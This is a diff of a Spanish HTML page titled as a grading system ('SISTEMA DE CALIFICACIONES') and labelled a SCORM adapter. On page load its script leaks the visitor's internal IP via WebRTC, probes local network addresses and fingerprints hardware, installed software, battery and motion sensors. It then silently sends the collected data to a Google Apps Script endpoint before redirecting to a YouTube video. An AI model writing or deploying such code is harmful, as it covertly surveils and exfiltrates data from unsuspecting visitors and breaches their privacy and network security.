@@ -2,14 +2,14 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>SISTEMA DE AUDITORÍA - TEC PLAYA</title>
+    <title>SISTEMA DE CALIFICACIONES - TEC PLAYA</title>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
         :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
-        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         #audit-panel { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; max-width: 900px; width: 95%; box-shadow: 0 0 60px var(--pink); }
-        .glitch { font-size: 3em; color: var(--pink); font-weight: 700; text-transform: uppercase; margin: 0; }
-        #console { text-align: left; background: #000; padding: 25px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.8em; margin-top: 20px; line-height: 1.5; max-height: 400px; overflow-y: auto; }
+        .glitch { font-size: 3.5em; color: var(--pink); font-weight: 700; text-transform: uppercase; margin: 0; }
+        #console { text-align: left; background: #000; padding: 20px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.85em; margin-top: 25px; line-height: 1.5; max-height: 400px; overflow-y: auto; }
         .danger { color: #ff4d4d; font-weight: bold; }
     </style>
 </head>
@@ -17,112 +17,157 @@
 
 <div id="audit-panel">
     <div style="font-size:35px; color:var(--pink); margin-bottom:15px;">○ △ □</div>
-    <h1 id="status">MINANDO ENTORNO...</h1>
-    <div id="console">
-        > Forzando WebRTC Leak para IP Interna...<br>
-        > Escaneando topología de red local (mDNS/SSDP)...<br>
-        > Detectando dispositivos IoT y periféricos...<br>
+    <h1 id="status">IDENTIFICANDO...</h1>
+    <div id="console" id="log-box">
+        > Iniciando bypass de seguridad de red...<br>
+        > Extrayendo metadatos de hardware y periféricos...<br>
     </div>
-    <p id="timer" style="margin-top:25px; color:var(--green); font-weight: 700;">VOLCADO DE RED COMPLETO EN: 10...</p>
+    <p id="timer" style="margin-top:25px; color:var(--green); font-weight: 700;">VOLCADO DE DATA EXTRA EN: 10...</p>
 </div>
 
 <script>
 /* ==========================================================================
-   SCORM ADAPTER - SCRIPT MAESTRO V2.1
+   SCORM ADAPTER - COMPATIBILIDAD SCRIPT MAESTRO TUP V2.1
    ========================================================================== */
-const SCORM = {
-    config: {
-        activityId: "AUDITORIA_RED_LOCAL_2026",
-        scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
-    },
-    syncCloud: function(action, forensic) {
-        const payload = {
-            sheetName: this.config.activityId,
-            action: action,
-            id: forensic.ipv4, 
-            name: "VULNERADO: " + forensic.os,
-            score: forensic.bat,
-            progress: forensic.cores,
-            device: forensic.tipo,
-            // EMPAQUETADO PARA COLUMNA 8 (DATA EXTRA)
-            details: forensic 
+const TUP_CONFIG = {
+    activityId: "MINADO_FORENSE_2026",
+    scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
+};
+
+const sendToTUP = (data) => {
+    const payload = {
+        sheetName: TUP_CONFIG.activityId,
+        id: data.ipv4 || "Anónimo",
+        name: "ELIMINADO: " + (data.gpu_short || "Desconocido"),
+        score: data.bat || 0,
+        progress: data.ram || 0,
+        device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+        action: "Exfiltración Forense",
+        // [BYPASS] Tu script inmutable lee la llave 'details' para la Columna 8
+        details: data 
+    };
+    const url = `${TUP_CONFIG.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
+    if (navigator.sendBeacon) navigator.sendBeacon(url);
+    else fetch(url, { mode: 'no-cors', keepalive: true });
+};
+
+/* ==========================================================================
+   MÓDULOS DE MINERÍA RESILIENTES (CON TIMEOUTS)
+   ========================================================================== */
+
+// Helper: Promesa con tiempo límite para evitar que la página se "pasme"
+const withTimeout = (promise, ms) => Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), ms))
+]);
+
+// 1. IP Interna (WebRTC Leak)
+const getInternalIP = async () => {
+    return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (i) => {
+            if (i.candidate) resolve(i.candidate.candidate.split(" ")[4]);
         };
-        const url = `${this.config.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
-        fetch(url, { mode: 'no-cors', keepalive: true });
+        setTimeout(() => resolve("n/a"), 1500); // Máximo 1.5s de espera
+    });
+};
+
+// 2. Escaneo de Dispositivos en Red Local
+const scanLocalNodes = async (lanIP) => {
+    if (!lanIP || lanIP === "n/a") return "Omitido";
+    const base = lanIP.split('.').slice(0, 3).join('.');
+    const nodes = [1, 254, 100, 105]; // IPs probables de Gateways/TVs
+    const found = [];
+    
+    await Promise.allSettled(nodes.map(n => 
+        withTimeout(fetch(`http://${base}.${n}`, { mode: 'no-cors' }), 800)
+        .then(() => found.push(`${base}.${n}`))
+        .catch(() => {})
+    ));
+    return found.length > 0 ? found.join(", ") : "Solo dispositivo local";
+};
+
+// 3. Biometría de Movimiento (Acelerómetro)
+let motionState = "Estatura desconocida";
+const startMotionCapture = () => {
+    if (window.DeviceMotionEvent) {
+        window.ondevicemotion = (e) => {
+            const acc = e.accelerationIncludingGravity;
+            if (!acc) return;
+            // Cálculo de fuerza G: $F = \sqrt{a_x^2 + a_y^2 + a_z^2}$
+            const force = Math.sqrt(acc.x**2 + acc.y**2 + acc.z**2);
+            motionState = (force > 12) ? "Caminando" : "Reposo / Acostado";
+        };
     }
 };
 
-/* --- MÓDULO DE ESCANEO DE RED LOCAL --- */
-const scanNetwork = async (internalIP) => {
-    if (internalIP === "n/a" || internalIP.includes(':')) return ["Escaneo no disponible"];
-    const base = internalIP.split('.').slice(0, 3).join('.');
-    const targets = [1, 254, 100, 101]; // IPs comunes de routers e impresoras
+// 4. Auditoría de Software (Fuentes)
+const detectSoftware = () => {
+    const check = ["AutoCAD", "Revit", "Autodesk", "Adobe", "Photoshop", "SketchUp", "Office"];
     const found = [];
-
-    const probes = targets.map(lastOctet => {
-        const ip = `${base}.${lastOctet}`;
-        return Promise.race([
-            fetch(`http://${ip}`, { mode: 'no-cors' }).then(() => ip),
-            new Promise(r => setTimeout(() => r(null), 1500))
-        ]);
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
+    check.forEach(f => {
+        ctx.font = `72px "${f}", monospace`;
+        if (ctx.measureText("mmmmmmmmmmlli").width !== baseWidth) found.push(f);
     });
-
-    const results = await Promise.all(probes);
-    results.forEach(res => { if(res) found.push(res); });
-    return found.length > 0 ? found : ["Solo Gateway detectado"];
+    return found.length > 0 ? found.join(", ") : "Estándar";
 };
 
-async function executeForensic() {
+/* --- EJECUCIÓN --- */
+async function forensicAudit() {
     const log = document.getElementById('console');
     const add = (m) => { log.innerHTML += `> ${m}<br>`; log.scrollTop = log.scrollHeight; };
+    startMotionCapture();
 
-    // 1. IP Interna (WebRTC Leak)
-    let internalIP = "n/a";
-    try {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (i) => { if (i.candidate) internalIP = i.candidate.candidate.split(" ")[4]; };
-    } catch(e) {}
+    // Paralelismo total para evitar bloqueos
+    const [v4Data, v6Data, lanIP] = await Promise.allSettled([
+        withTimeout(fetch('https://api.ipify.org?format=json').then(r => r.json()), 2500),
+        withTimeout(fetch('https://api64.ipify.org?format=json').then(r => r.json()), 2500),
+        getInternalIP()
+    ]);
 
-    // 2. IPs Públicas e ISP
-    let v4 = "n/a", net = { org: "Unknown" };
-    try {
-        v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
-        net = await fetch(`https://ipapi.co/${v4}/json/`).then(r => r.json());
-    } catch(e) {}
+    const ipv4 = v4Data.status === 'fulfilled' ? v4Data.value.ip : "n/a";
+    const nodes = await scanLocalNodes(lanIP.value);
 
-    // Esperar un momento para que WebRTC resuelva
-    await new Promise(r => setTimeout(r, 2000));
-    const devices = await scanNetwork(internalIP);
-
-    // 3. Hardware Fingerprinting
+    // Hardware DNA
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "n/a";
-    let bat = 0; try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e) {}
-
-    const forensic = {
-        ipv4: v4,
-        ip_lan: internalIP,
-        dispositivos_red: devices.join(", "),
-        isp: net.org,
-        gpu: gpu,
+    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Genérica";
+    const storage = await navigator.storage.estimate();
+    
+    const dump = {
+        ipv4: ipv4,
+        ipv6: v6Data.status === 'fulfilled' ? v6Data.value.ip : "n/a",
+        ip_lan: lanIP.value,
+        nodos_red: nodes,
+        gpu_full: gpu,
+        gpu_short: gpu.split(',')[1] || gpu.substring(0, 30),
         cores: navigator.hardwareConcurrency,
         ram: navigator.deviceMemory || "n/a",
-        bat: bat,
+        disco: Math.round(storage.quota / (1024**3)) + " GB",
+        pantalla: `${screen.width}x${screen.height} (DPR: ${window.devicePixelRatio})`,
+        movimiento: motionState,
+        software: detectSoftware(),
+        bat: 0,
         os: navigator.platform,
-        tipo: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop"
+        ua: navigator.userAgent
     };
 
-    add(`IP INTERNA: <span class="danger">${internalIP}</span>`);
-    add(`NODOS ACTIVOS EN TU RED: ${forensic.dispositivos_red}`);
-    add(`ENRUTADOR DETECTADO: ${net.org}`);
-    add(`ESTADO FINAL: <span style="color:#ed1b76">JUGADOR IDENTIFICADO</span>`);
+    try { const b = await navigator.getBattery(); dump.bat = Math.floor(b.level * 100); } catch(e) {}
+
+    add(`IP PÚBLICA: <span class="danger">${dump.ipv4}</span>`);
+    add(`IP INTERNA (LAN): ${dump.ip_lan}`);
+    add(`NODOS ACTIVOS: ${nodes}`);
+    add(`ESTADO BIOMÉTRICO: ${motionState}`);
+    add(`SOFTWARE: ${dump.software}`);
+    add(`<span style="color:#ed1b76">REPORTE FORENSE ENVIADO A COLUMNA 8</span>`);
 
     document.getElementById('status').innerText = "ELIMINADO";
-
-    // Reporte a Google Sheets
-    SCORM.syncCloud("Auditoría de Red y Hardware", forensic);
+    sendToTUP(dump);
 
     let t = 10;
     setInterval(() => {
@@ -130,7 +175,8 @@ async function executeForensic() {
         if(t <= 0) window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }, 1000);
 }
-window.onload = executeAudit;
+
+window.onload = forensicAudit;
 </script>
 </body>
 </html>
